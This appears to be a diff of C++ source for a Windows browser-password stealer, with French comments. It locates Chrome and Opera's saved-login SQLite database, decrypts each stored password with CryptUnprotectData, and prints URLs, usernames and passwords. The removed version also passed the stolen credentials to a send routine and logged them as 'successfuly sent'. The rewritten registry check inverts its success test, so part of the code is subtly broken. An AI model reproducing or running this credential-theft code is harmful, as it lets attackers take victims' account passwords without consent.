@@ -1,162 +1,79 @@
+# define QUERY "SELECT origin_url, username_value, length(password_value), password_value FROM logins"
 
-#include "BrowserPassword.hh"
-
-BrowserPassword::BrowserPassword()
-{
-	_type = BrowserType::CHROME;
-	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::CHROME, _CHROME_REGKEY_PATH));
-	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::OPERA, _OPERA_REGKEY_PATH));
-	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::CHROME, _CHROME_DATABASE_PATH));
-	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::OPERA, _OPERA_DATABASE_PATH));
-}
-
-BrowserPassword::~BrowserPassword()
-{
-}
-
-void					BrowserPassword::findCurrentUserName()
-{
-	DWORD				len = UNLEN + 1;
-	wchar_t				usernameUnicode[UNLEN + 1] = { 0 };
-	char				usernameUtf[UNLEN + 1] = { 0 };
-
-	GetUserName(usernameUnicode, &len);
-	std::wcstombs(usernameUtf, usernameUnicode, sizeof(usernameUnicode));
-	_userName.append(usernameUtf);
-}
-
-void					BrowserPassword::getBrowserPassword()
-{
-	BrowserPassword			browser;
-	std::string			userName = findCurrentUserName();
-	
-	browser.setBrowserType(BrowserPassword::BrowserType::CHROME);
-	browser.databaseSpying();
-	if (!browser.passwordIsEmpty())
-	{
-		sendBrowserPassword(browser.getBrowserInfo(), userName);
-		std::cout << "[OK]\tChrome password successfuly sent" << std::endl;
-	}
-	else
-		std::cerr << "[KO]\tThere is no Chrome password" << std::endl;
-	browser.setBrowserType(BrowserPassword::BrowserType::OPERA);
-	browser.databaseSpying();
-	if (!browser.passwordIsEmpty())
-	{
-		sendBrowserPassword(browser.getBrowserInfo(), userName);
-		std::cout << "[OK]\tOpera password successfuly sent" << std::endl;
-	}
-	else
-		std::cerr << "[KO]\tThere is no Opera password" << std::endl;
-}
-
-void					BrowserPassword::setBrowserType(const BrowserType &type)
-{
-	_type = type;
-}
-
-void					BrowserPassword::printPassword()
-{
-	std::vector<t_loginConnection>::iterator	it;
-
-	it = _vectorLoginConnection.begin();
-	while (it != _vectorLoginConnection.end())
-	{
-		std::cout << "Url: " << it->_url.c_str() << "\nUsername: " << it->_username.c_str() << "\nPassword: " << it->_password.c_str() << std::endl;
-		++it;
-	}
-}
-
-const std::vector<BrowserPassword::t_loginConnection>	&BrowserPassword::getBrowserInfo() const
-{
-	return (_vectorLoginConnection);
-}
-
-bool					BrowserPassword::passwordIsEmpty()
-{
-	return (_vectorLoginConnection.empty());
-}
-
-bool					BrowserPassword::findAppdataPath(std::string &appdataPath)
-{
-	char				utfPath[MAX_PATH] = { 0 };
-	wchar_t				unicodePath[MAX_PATH] = { 0 };
-	
-	if (SUCCEEDED(SHGetFolderPath(NULL, (int)_type, NULL, 0, unicodePath)) == FALSE)
-	{
-		std::cerr << "[KO]\tError failed to find Appdata directory" << std::endl;
+bool isBrowserInstalled(const char *regKeyPath) 
+{ 
+	HKEY hkey = NULL;
+	if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyPath, 0, KEY_READ, &hkey))
+	{ 
+		std::cerr << "[KO]\tBrowser is not installed" << std::endl; 
 		return (false);
-	}
-	std::wcstombs(utfPath, unicodePath, sizeof(unicodePath));
-	appdataPath.append(utfPath);
+        }
+	RegCloseKey(hkey); // on referme la clé après l'ouverture grâce au handle hkey         
 	return (true);
 }
 
-bool					BrowserPassword::isBrowserInstalled()
-{
-	HKEY				hkey = NULL;
-
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _mapRegKeyPath[_type], 0, KEY_READ, &hkey) != ERROR_SUCCESS)
-	{
-		std::cerr << "[KO]\tBrowser is not installed" << std::endl;
-		return (false);
-	}
-	RegCloseKey(hkey);
+bool findAppdataPath(std::string &appdataPath, int folder) 
+{ 
+	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters, macro présente dans Windows.h 
+	if (!SUCCEEDED(SHGetFolderPathA(NULL, folder, NULL, 0, path))) 
+	{ 
+		std::cerr << "[KO]\tError failed to find Appdata directory" << std::endl; 
+		return (false); 
+	}         
+	appdataPath.append(path); // on ajoute la path dans notre string 
 	return (true);
 }
 
-const char				*BrowserPassword::uncryptData(BYTE *password, int size)
-{
-	DATA_BLOB			in;
-	DATA_BLOB			out;
+void findPasswordTable(sqlite3 *db) 
+{ 
+	sqlite3_stmt *stmt;
+	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, NULL) == SQLITE_OK) 
+	{ 
+		while (sqlite3_step(stmt) == SQLITE_ROW)  
+			printPassword(stmt); /* On déchiffre et on affiche les mots de passes */  
+	} 
+	else 
+		std::cerr << "[KO]\tError compiling query" << std::endl; sqlite3_finalize(stmt); // on indique que l'on a plus besoin de la déclaration 
+	sqlite3_close(db); // on ferme la bdd 
+}
 
-	in.pbData = password;
-	in.cbData = size + 1;
-	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
-	{
-		out.pbData[out.cbData] = 0;
+const char *uncryptData(BYTE *password, int size) 
+{ 
+	DATA_BLOB in; 
+	DATA_BLOB out;
+
+        in.pbData = password;
+        in.cbData = size + 1; 
+	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
+	{ 
+		out.pbData[out.cbData] = 0; // on set le '\0' 
 		return ((const char*)out.pbData);
-	}
-	return (_ERROR_UNCRYPT);
+        } 
+	return ("Error not found\n");
 }
 
-void					BrowserPassword::getBrowserPassword(sqlite3 *db)
-{
-	sqlite3_stmt		*stmt;
-	t_loginConnection	login;
-
-	std::cout << "[OK]\tDatabase found" << std::endl;
-	if (sqlite3_prepare_v2(db, _GET_PASSWORD_QUERY, -1, &stmt, 0) == SQLITE_OK)
-	{
-		while (sqlite3_step(stmt) == SQLITE_ROW)
-		{
-			login._url.append((const char*)sqlite3_column_text(stmt, 0));
-			login._username.append((const char*)sqlite3_column_text(stmt, 1));
-			login._password.append(uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2)));
-			_vectorLoginConnection.push_back(login);
-		}
-	}
-	else
-		std::cerr << "[KO]\tError preparing database" << std::endl;
-	sqlite3_finalize(stmt);
-	sqlite3_close(db);
+void printPassword(sqlite3_stmt *stmt) 
+{ 
+	puts((const char*)sqlite3_column_text(stmt, 0)); // affiche l'url 
+	puts((const char*)sqlite3_column_text(stmt, 1)); // affiche le login 
+	// déchiffre et affiche le mot de passe 
+	puts(uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))); 
 }
 
-void					BrowserPassword::databaseSpying()
-{
-	sqlite3				*db;
-	std::string			databasePath;
+void databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder) 
+{ 
+        sqlite3 *db; 
+        std::string dbPath; 
 
-	std::cout << "Looking for browser's passwords ..." << std::endl;
-	if (isBrowserInstalled())
-	{
-		if (findAppdataPath(databasePath))
-		{
-			databasePath += _mapDatabasePath[_type];
-			if (sqlite3_open(databasePath.c_str(), &db) == SQLITE_OK)
-				getBrowserPassword(db);
-			else
-				std::cerr << "[KO]\tError opening database" << std::endl;
-		}
-	}
+        if (isBrowserInstalled(regKeyPath)) // y a t'il bien un navigateur Chrome Engine ?
+        {
+                if (findAppdataPath(dbPath, folder)) // quel est son dossier appdata ?
+                { 
+                        dbPath += dbFilePath; // path du dossier appadata + le path du fichier de la bdd
+                        if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK) 
+                                findPasswordTable(db); /* Trouver les mots de passes et les déchiffrer */
+                        else 
+                                std::cerr << "[KO]\tError opening database" << std::endl; 
+                } 
+       } 
 }
